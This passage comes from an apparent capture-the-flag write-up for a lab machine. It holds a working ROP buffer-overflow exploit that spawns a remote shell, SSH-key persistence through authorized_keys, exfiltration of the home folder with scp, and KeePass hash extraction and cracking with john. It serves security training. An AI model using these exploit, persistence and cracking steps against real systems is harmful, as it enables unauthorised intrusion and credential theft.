+                <span style="color:#0088ff;font-weight:400">#&nbsp;&nbsp;401156: 48&nbsp;89&nbsp;e7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;rdi,rsp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;move&nbsp;rsp&nbsp;(/bin/sh)&nbsp;into&nbsp;rdi</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;&nbsp;401159: 41&nbsp;ff&nbsp;e5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp&nbsp;&nbsp;&nbsp;&nbsp;r13&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;jump&nbsp;to&nbsp;code&nbsp;in&nbsp;r13</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;...</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;-------&nbsp;EXPLOIT&nbsp;-------</span><br>
+                payload&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>*<span style="color:#ff0044;font-weight:400">112</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;offset&nbsp;to&nbsp;RIP&nbsp;at&nbsp;120&nbsp;bytes</span><br>
+                payload&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"/bin/sh\x00"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;rbp&nbsp;points&nbsp;here</span><br>
+                payload&nbsp;+=&nbsp;pop_r13_14_15_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;overwrite&nbsp;RIP</span><br>
+                payload&nbsp;+=&nbsp;system_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;system()&nbsp;addr&nbsp;into&nbsp;r13</span><br>
+                payload&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"C"</span>*<span style="color:#ff0044;font-weight:400">8</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;junk&nbsp;into&nbsp;r14</span><br>
+                payload&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"D"</span>*<span style="color:#ff0044;font-weight:400">8</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;junk&nbsp;into&nbsp;r15</span><br>
+                <br>
+                payload&nbsp;+=&nbsp;test_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;moves&nbsp;pointer&nbsp;to&nbsp;"/bin/sh"&nbsp;into&nbsp;rdi</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;and&nbsp;jumps&nbsp;to&nbsp;r13&nbsp;-&nbsp;system()</span><br>
+                <br>
+                r&nbsp;=&nbsp;remote(<span style="color:#3ad900;font-weight:400">'10.10.10.147'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">1337</span>)<br>
+                r.sendline(payload)<br>
+                r.interactive()<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#print&nbsp;payload</span>
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-8" name="h2-8"></a><strong></strong>
+        <h2><strong>8) Exploit myapp</strong></h2><br>
+        Exploit this thing, finally.<br>
+            <div class="codebox">
+                root@city64:~/ctf/safe#&nbsp;python&nbsp;exploit.py<br>
+                [+]&nbsp;Opening&nbsp;connection&nbsp;to&nbsp;10.10.10.147&nbsp;on&nbsp;port&nbsp;1337:&nbsp;Done<br>
+                [*]&nbsp;Switching&nbsp;to&nbsp;interactive&nbsp;mode<br>
+                &nbsp;12:50:59&nbsp;up&nbsp;17&nbsp;min,&nbsp;&nbsp;0&nbsp;users,&nbsp;&nbsp;load&nbsp;average:&nbsp;0.00,&nbsp;0.00,&nbsp;0.00<br>
+                $&nbsp;id<br>
+                uid=1000(user)&nbsp;gid=1000(user)&nbsp;groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth)<br>
+                $&nbsp;cd&nbsp;home<br>
+                $&nbsp;ls&nbsp;-alh<br>
+                total&nbsp;12K<br>
+                drwxr-xr-x&nbsp;&nbsp;3&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;May&nbsp;13&nbsp;08:34&nbsp;.<br>
+                drwxr-xr-x&nbsp;22&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;May&nbsp;13&nbsp;08:32&nbsp;..<br>
+                drwxr-xr-x&nbsp;&nbsp;3&nbsp;user&nbsp;user&nbsp;4.0K&nbsp;May&nbsp;13&nbsp;11:18&nbsp;user<br>
+                $&nbsp;cd&nbsp;user<br>
+                $&nbsp;ls<br>
+                ...<br>
+                user.txt<br>
+                $&nbsp;cat&nbsp;user.txt<br>
+                7a29ee9...
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-9" name="h2-9"></a><strong></strong>
+        <h2><strong>9) SSH Persistence</strong></h2><br>
+        Secure a permanent connection to <code>user</code> by creating an <code>authorized_keys</code> file and adding your ssh public key to it.<br>
+        <br>
+        Generate an ssh key if you don't have one - <code>ssh-keygen -t rsa -b 4096</code><br>
+        And retrieve your public key from <code>/root/.ssh/id_rsa.pub</code> - <code>cat /root/.ssh/id_rsa.pub</code><br>
+        <br>
+        On your exploit shell, create an <code>authorized_keys</code> file and <code>echo</code> your public key into it.<br>
+            <div class="codebox">
+                $&nbsp;cd&nbsp;/home/user/.ssh<br>
+                $&nbsp;touch&nbsp;authorized_keys<br>
+                $&nbsp;echo&nbsp;"ssh-rsa&nbsp;AAAAB3NzaC1yc2EAAAADAQABAAACAQDubnsite6+BZra+1yAChYHV4ar8P0vkke1IWlZLwGP85bThoKe+pICmD15nweBXA4Rp5UMfJLBzBtXMN+QhVXBvkzAzTHeOIFAxBY/VE6FSBOTGYs+Q77Hnwdt7gIqqmXmUTpOwM0bPxnJTAh6L7lP9D+k+PK060BwmAmiPRHLyKa0KTbIRilRQZB4G8Fb9DOAweXr+r8d0Bw7/rUD3tUfSO2qcyuh2D7yQbCrwj1orYcj9r1ApYdPAZtqDmKknMtVGFjUVBIoti9iVZ6DD75lfRHclyqChgKDt2d7D0nDfTED2PaaoEG6vmGfHp51cNA21Fdh71mR1gE5T9V2IoCFujN7Ls7WSHn+K+q0s4m2VMgMYe1GT9+dxKIkYrqIs72m5Qt2GA8CarPatG2ZQ109/KZc9p9so7lpTJlxbiQg58CkwpFIBP0uXj9CHMPnG7D5Cr3eaz8sU3egyflT4YaXx1PB2IdrACorukDtgDpxKWRVFduyf7qLhR9Yjsr358cgaBRh89V+RImmhVrioQOx9brl70NbNO/jgav7ACo8/P0wk2WzDGB6W05y+pagAAhu4zdsksXyB/VImOZ4Sx9dzJTyBUnjIWIbKDmS+m+H28Vkm2rzLYefSxPNMBtuMquvCuZV15mHMx97MDRF/qxeNiKUpFG2kX0FF7eYCI2BVw==&nbsp;root@city64"&nbsp;&gt;&gt;&nbsp;authorized_keys
+            </div>
+        </div><br>
+        <br>
+        You can now ssh into the target as <code>user</code> using your ssh private key.<br>
+            <div class="codebox">
+                root@city64:~/ctf/safe#&nbsp;ssh&nbsp;user@10.10.10.147&nbsp;-i&nbsp;/root/.ssh/id_rsa<br>
+                ...<br>
+                user@safe:~$&nbsp;
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-10" name="h2-10"></a><strong></strong>
+        <h1><strong>Priv-Esc root</strong></h1>
+        <br>
+        <a id="h2-11" name="h2-11"></a><strong></strong>
+        <h2><strong>10) Priv-Esc</strong></h2><br>
+        There aren't the tools to investigate any of these files on the target system.<br>
+        I copied the contents of <code>user</code>'s home folder to my attacking machine using <code>scp</code>.<br>
+            <div class="codebox">
+                root@city64:~/ctf/safe#&nbsp;scp&nbsp;-r&nbsp;user@10.10.10.147:/home/user&nbsp;.&nbsp;-i&nbsp;/root/.ssh/id_rsa.pub<br>
+                /root/.ssh/id_rsa.pub:&nbsp;Not&nbsp;a&nbsp;directory<br>
+                root@city64:~/ctf/safe/user#&nbsp;scp&nbsp;-i&nbsp;/root/.ssh/id_rsa.pub&nbsp;-r&nbsp;user@10.10.10.147:/home/user&nbsp;.<br>
+                IMG_0547.JPG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;100%&nbsp;2470KB&nbsp;&nbsp;&nbsp;1.5MB/s&nbsp;&nbsp;&nbsp;00:01&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                IMG_0545.JPG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;100%&nbsp;1863KB&nbsp;&nbsp;&nbsp;2.9MB/s&nbsp;&nbsp;&nbsp;00:00&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                IMG_0548.JPG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;100%&nbsp;2858KB&nbsp;&nbsp;&nbsp;2.9MB/s&nbsp;&nbsp;&nbsp;00:00&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                myapp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;100%&nbsp;&nbsp;&nbsp;16KB&nbsp;275.9KB/s&nbsp;&nbsp;&nbsp;00:00&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                authorized_keys&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;100%&nbsp;&nbsp;737&nbsp;&nbsp;&nbsp;&nbsp;18.4KB/s&nbsp;&nbsp;&nbsp;00:00&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                MyPasswords.kdbx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;100%&nbsp;2446&nbsp;&nbsp;&nbsp;&nbsp;44.1KB/s&nbsp;&nbsp;&nbsp;00:00&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                scp:&nbsp;/home/user/.bash_history:&nbsp;not&nbsp;a&nbsp;regular&nbsp;file<br>
+                .bashrc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;100%&nbsp;3526&nbsp;&nbsp;&nbsp;&nbsp;68.6KB/s&nbsp;&nbsp;&nbsp;00:00&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                .bash_logout&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;100%&nbsp;&nbsp;220&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5.4KB/s&nbsp;&nbsp;&nbsp;00:00&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                IMG_0552.JPG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;100%&nbsp;1099KB&nbsp;&nbsp;&nbsp;2.5MB/s&nbsp;&nbsp;&nbsp;00:00&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                .profile&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;100%&nbsp;&nbsp;675&nbsp;&nbsp;&nbsp;&nbsp;16.6KB/s&nbsp;&nbsp;&nbsp;00:00&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                IMG_0546.JPG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;100%&nbsp;1872KB&nbsp;&nbsp;&nbsp;2.4MB/s&nbsp;&nbsp;&nbsp;00:00&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                IMG_0553.JPG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;100%&nbsp;1060KB&nbsp;&nbsp;&nbsp;2.5MB/s&nbsp;&nbsp;&nbsp;00:00&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                user.txt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;100%&nbsp;&nbsp;&nbsp;33&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0.8KB/s&nbsp;&nbsp;&nbsp;00:00&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                root@city64:~/ctf/safe#&nbsp;cd&nbsp;user<br>
+                root@city64:~/ctf/safe/user#&nbsp;ls<br>
+                IMG_0545.JPG&nbsp;&nbsp;IMG_0547.JPG&nbsp;&nbsp;IMG_0552.JPG&nbsp;&nbsp;myapp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;user.txt<br>
+                IMG_0546.JPG&nbsp;&nbsp;IMG_0548.JPG&nbsp;&nbsp;IMG_0553.JPG&nbsp;&nbsp;MyPasswords.kdbx
+            </div>
+        </div><br>
+        <br>
+        <code>MyPasswords.kbdx</code> is a KeePass database.<br>
+        <br>
+        I investigated the <code>img</code> files' strings for passwords, but didn't find anything.<br>
+        <code>strings -n 12 IMG_*</code><br>
+        <br>
+        To open a KeePass database, the user can choose to require both a password <em>and</em> a key file.<br>
+        Considering there's nothing useful in the images, one of them could be a key file.<br>
+        <br>
+        <a id="h2-12" name="h2-12"></a><strong></strong>
+        <h2><strong>11) keepass2john</strong></h2><br>
+        You can extract/generate keepass hashes to be cracked with <code>john</code> using <code>keypass2john</code>, and providing a key file and the database.<br>
+            <div class="codebox">
+                root@city64:~/ctf/safe/user#&nbsp;keepass2john<br>
+                Usage:&nbsp;keepass2john&nbsp;[-k&nbsp;&lt;keyfile&gt;]&nbsp;&lt;.kdbx&nbsp;database(s)&gt;
+            </div>
+        </div><br>
+        <br>
+        I ran keepass2john with no img key plus each of the <code>img</code> files against the database to create a <code>hashes.txt</code> file containing all the computed hashes.<br>
+            <div class="codebox">
+                root@city64:~/ctf/safe/user#&nbsp;keepass2john&nbsp;MyPasswords.kdbx&nbsp;&gt;&nbsp;hashes.txt<br>
+                root@city64:~/ctf/safe/user#&nbsp;keepass2john&nbsp;-k&nbsp;IMG_0545.JPG&nbsp;MyPasswords.kdbx&nbsp;&gt;&gt;&nbsp;hashes.txt<br>
+                root@city64:~/ctf/safe/user#&nbsp;keepass2john&nbsp;-k&nbsp;IMG_0546.JPG&nbsp;MyPasswords.kdbx&nbsp;&gt;&gt;&nbsp;hashes.txt<br>
+                root@city64:~/ctf/safe/user#&nbsp;keepass2john&nbsp;-k&nbsp;IMG_0547.JPG&nbsp;MyPasswords.kdbx&nbsp;&gt;&gt;&nbsp;hashes.txt<br>
+                root@city64:~/ctf/safe/user#&nbsp;keepass2john&nbsp;-k&nbsp;IMG_0548.JPG&nbsp;MyPasswords.kdbx&nbsp;&gt;&gt;&nbsp;hashes.txt<br>
+                root@city64:~/ctf/safe/user#&nbsp;keepass2john&nbsp;-k&nbsp;IMG_0552.JPG&nbsp;MyPasswords.kdbx&nbsp;&gt;&gt;&nbsp;hashes.txt<br>
+                root@city64:~/ctf/safe/user#&nbsp;keepass2john&nbsp;-k&nbsp;IMG_0553.JPG&nbsp;MyPasswords.kdbx&nbsp;&gt;&gt;&nbsp;hashes.txt
+            </div>
+        </div><br>
+        <br>
+        Each of the entries is known as <code>MyPassword</code>, so I edited the file in nano and appended the name of the image to its corresponding hash. This way I could tell which image's hash had been cracked via the output from <code>john</code>.<br>
+            <div class="codebox">
+                root@city64:~/ctf/safe/user#&nbsp;nano&nbsp;hashes.txt<br>
+                MyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b$...<br>
+                MyPasswords45:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a8$...<br>
+                MyPasswords46:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a8$...<br>
+                MyPasswords47:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a8$...<br>
+                MyPasswords48:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a8$...<br>
+                MyPasswords52:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a8$...<br>
+                MyPasswords53:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a8$...
+            </div>
+        </div><br>
+        (the hashes have been trimmed to keep this code box readable)<br>
+        <br>
+        <a id="h2-13" name="h2-13"></a><strong></strong>
+        <h2><strong>12) john - Crack hashes</strong></h2><br>
+        Crack the hashes using <code>john</code>!<br>
+        I'm using <code>seclists</code>'s <code>darkweb2017-top10000.txt</code> password list to crack the file.<br>
+        Download <code>seclists</code> like so - <code>apt install seclists</code><br>
+            <div class="codebox">
+                root@city64:~/ctf/safe/user#&nbsp;john&nbsp;--wordlist=/usr/share/seclists/Passwords/darkweb2017-top10000.txt&nbsp;--format=KeePass&nbsp;hashes.txt<br>
+                Using&nbsp;default&nbsp;input&nbsp;encoding:&nbsp;UTF-8<br>
+                Loaded&nbsp;7&nbsp;password&nbsp;hashes&nbsp;with&nbsp;7&nbsp;different&nbsp;salts&nbsp;(KeePass&nbsp;[SHA256&nbsp;AES&nbsp;32/64&nbsp;OpenSSL])<br>
+                Cost&nbsp;1&nbsp;(iteration&nbsp;count)&nbsp;is&nbsp;60000&nbsp;for&nbsp;all&nbsp;loaded&nbsp;hashes<br>
+                Cost&nbsp;2&nbsp;(version)&nbsp;is&nbsp;2&nbsp;for&nbsp;all&nbsp;loaded&nbsp;hashes<br>
+                Cost&nbsp;3&nbsp;(algorithm&nbsp;[0=AES,&nbsp;1=TwoFish,&nbsp;2=ChaCha])&nbsp;is&nbsp;0&nbsp;for&nbsp;all&nbsp;loaded&nbsp;hashes<br>
+                Will&nbsp;run&nbsp;2&nbsp;OpenMP&nbsp;threads<br>
+                Press&nbsp;'q'&nbsp;or&nbsp;Ctrl-C&nbsp;to&nbsp;abort,&nbsp;almost&nbsp;any&nbsp;other&nbsp;key&nbsp;for&nbsp;status<br>
+                0g&nbsp;0:00:00:03&nbsp;0.31%&nbsp;(ETA:&nbsp;12:38:49)&nbsp;0g/s&nbsp;7.920p/s&nbsp;68.64c/s&nbsp;68.64C/s&nbsp;myspace1..target123<br>
+                0g&nbsp;0:00:00:52&nbsp;4.94%&nbsp;(ETA:&nbsp;12:39:58)&nbsp;0g/s&nbsp;9.527p/s&nbsp;67.30c/s&nbsp;67.30C/s&nbsp;edward..135790<br>
+                bullshit&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(MyPasswords47)<br>
+                1g&nbsp;0:00:03:07&nbsp;21.91%&nbsp;(ETA:&nbsp;12:36:39)&nbsp;0.005345g/s&nbsp;11.84p/s&nbsp;77.49c/s&nbsp;77.49C/s&nbsp;marcos..22222<br>
+                1g&nbsp;0:00:09:59&nbsp;DONE&nbsp;0.001668g/s&nbsp;16.68p/s&nbsp;102.0c/s&nbsp;102.0C/s&nbsp;21..starstar<br>
